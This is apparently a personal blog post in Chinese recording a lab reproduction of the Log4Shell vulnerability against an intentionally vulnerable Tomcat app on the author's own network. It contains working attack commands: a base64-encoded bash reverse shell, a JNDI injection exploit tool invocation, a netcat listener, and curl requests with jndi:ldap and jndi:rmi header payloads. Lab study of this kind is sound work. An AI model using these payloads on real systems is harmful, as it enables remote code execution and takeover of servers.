---
title: "复现低版本log4shell(ing)"
date: "2026-09-13"
lastmod: 2026-09-13T13:53:49.115Z
slug: "复现低版本log4shell"
summary: ""
tags:
  - "java"
  - "jdni"
categories: []
draft: false
cover: ""
params:
  protected: false
---

# 复现低版本log4shell

## 1.环境准备：

### 1.1.靶机搭建

参考项目：

```bash
https://github.com/tothi/log4shell-vulnerable-app?utm_source=chatgpt.com
```

```bash
lily2663@ubuntu:~/src/log4shell-vulnerable-app$
lily2663@ubuntu:~/src/log4shell-vulnerable-app$ ls
build         gradle   gradlew.bat                    log4shell_rce_demo.png  src
build.gradle  gradlew  log4shell_rce_demo_empire.png  README.md
lily2663@ubuntu:~/src/log4shell-vulnerable-app$ ./gradlew./gradlew shadowJar
-bash: ./gradlew./gradlew: 没有那个文件或目录
lily2663@ubuntu:~/src/log4shell-vulnerable-app$ ./gradlew shadowJar
Starting a Gradle Daemon, 2 busy Daemons could not be reused, use --status for details

BUILD SUCCESSFUL in 19s
3 actionable tasks: 1 executed, 2 up-to-date
lily2663@ubuntu:~/src/log4shell-vulnerable-app$ ./gradlew appRun
九月 13, 2026 9:17:45 下午 org.apache.coyote.AbstractProtocol init
信息: Initializing ProtocolHandler ["http-nio-8080"]
九月 13, 2026 9:17:45 下午 org.apache.catalina.core.StandardService initInternal
严重: Failed to initialize connector [Connector[HTTP/1.1-8080]]
org.apache.catalina.LifecycleException: Protocol handler initialization failed
        at org.apache.catalina.connector.Connector.initInternal(Connector.java:1077)
        at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
        at org.apache.catalina.core.StandardService.initInternal(StandardService.java:557)
        at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
        at org.apache.catalina.core.StandardServer.initInternal(StandardServer.java:850)
        at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:136)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:173)
        at org.apache.catalina.startup.Tomcat.start(Tomcat.java:440)
        at org.apache.catalina.startup.Tomcat$start$0.call(Unknown Source)
        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:115)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:119)
        at org.akhikhl.gretty.TomcatServerManager.startServer(TomcatServerManager.groovy:59)
        at org.akhikhl.gretty.ServerManager$startServer$0.call(Unknown Source)
        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:115)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:127)
        at org.akhikhl.gretty.Runner.run(Runner.groovy:129)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:497)
        at org.codehaus.groovy.runtime.callsite.PlainObjectMetaMethodSite.doInvoke(PlainObjectMetaMethodSite.java:43)
        at org.codehaus.groovy.runtime.callsite.PogoMetaMethodSite$PogoCachedMethodSiteNoUnwrapNoCoerce.invoke(PogoMetaMethodSite.java:190)
        at org.codehaus.groovy.runtime.callsite.PogoMetaMethodSite.call(PogoMetaMethodSite.java:70)
        at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:115)
        at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:119)
        at org.akhikhl.gretty.Runner.main(Runner.groovy:54)
Caused by: java.net.BindException: 地址已在使用
        at sun.nio.ch.Net.bind0(Native Method)
        at sun.nio.ch.Net.bind(Net.java:433)
        at sun.nio.ch.Net.bind(Net.java:425)
        at sun.nio.ch.ServerSocketChannelImpl.bind(ServerSocketChannelImpl.java:223)
        at sun.nio.ch.ServerSocketAdaptor.bind(ServerSocketAdaptor.java:74)
        at org.apache.tomcat.util.net.NioEndpoint.bind(NioEndpoint.java:222)
        at org.apache.tomcat.util.net.AbstractEndpoint.init(AbstractEndpoint.java:1147)
        at org.apache.tomcat.util.net.AbstractJsseEndpoint.init(AbstractJsseEndpoint.java:222)
        at org.apache.coyote.AbstractProtocol.init(AbstractProtocol.java:599)
        at org.apache.coyote.http11.AbstractHttp11Protocol.init(AbstractHttp11Protocol.java:80)
        at org.apache.catalina.connector.Connector.initInternal(Connector.java:1074)
        ... 28 more

九月 13, 2026 9:17:45 下午 org.apache.catalina.core.StandardService startInternal
信息: Starting service [Tomcat]
九月 13, 2026 9:17:45 下午 org.apache.catalina.core.StandardEngine startInternal
信息: Starting Servlet engine: [Apache Tomcat/8.5.68]
九月 13, 2026 9:17:46 下午 org.apache.catalina.startup.ContextConfig getDefaultWebXmlFragment
信息: No global web.xml found
九月 13, 2026 9:17:47 下午 org.apache.jasper.servlet.TldScanner scanJars
信息: At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
21:17:47 INFO  Tomcat 8.5.68 started and listening on port -1
21:17:47 INFO  app runs at:
21:17:47 INFO    http://localhost:-1/app

> Task :appRun
Press any key to stop the server.
<===========--> 87% EXECUTING [16m 4s]
> :appRun

```



### 1.2.网络环境：

```
Windows 宿主机（192.168.31.85）：真正的局域网 IP，连接靶机和外部网络的桥头堡
Kali (WSL2 虚拟机，内部 IP 172.22.79.147)：攻击工具的实际运行环境。它处于 NAT 网络，局域网其他机器无法直接访问它
靶机（192.168.31.27:8080）：受害者，运行着 log4shell-vulnerable-app，JDK 版本 8u65
```

构建wsl2的端口转发：

管理员身份运行powershell

运行

```bash
netsh interface portproxy add v4tov4 listenport=1099 listenaddress=0.0.0.0 connectport=1099 connectaddress=172.22.79.147
netsh interface portproxy add v4tov4 listenport=1389 listenaddress=0.0.0.0 connectport=1389 connectaddress=172.22.79.147
netsh interface portproxy add v4tov4 listenport=8180 listenaddress=0.0.0.0 connectport=8180 connectaddress=172.22.79.147
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=172.22.79.147
```

放生防火墙：

```bash
New-NetFirewallRule -DisplayName "WSL JNDI" -Direction Inbound -LocalPort 1099,1389,8180,4444 -Protocol TCP -Action Allow
```

## 2.攻击流程

（均在攻击机kali完成）

### 2.1.生成payload+工具

#### 1.base64编码：

```bash
echo -n 'bash -i >& /dev/tcp/192.168.31.85/4444 0>&1' | base64 -w0
```

#### 2.启动工具：

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
-C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjg1LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" \
-A "192.168.31.85"
```

使用jdk1.8的ldap链接

### 2.2.启动监听+反弹shell准备

```
nc -lvnp 4444
```

准备弹shell

### 2.3.触发漏洞

ldag成功

```bash
curl http://192.168.31.27:8080/app/ -H 'x-log: ${jndi:ldap://192.168.31.85:1389/cq2vij}'
```

最后成功反弹shell

![1789306272179](/assets/img/typora/1789306272179.png)



rmi依旧成功：

```
curl http://192.168.31.27:8080/app/servlet -H 'x-log: ${jndi:rmi://192.168.31.85:1099/lcymxc}'
```

![1789306933340](/assets/img/typora/1789306933340.png)

![1789306947607](/assets/img/typora/1789306947607.png)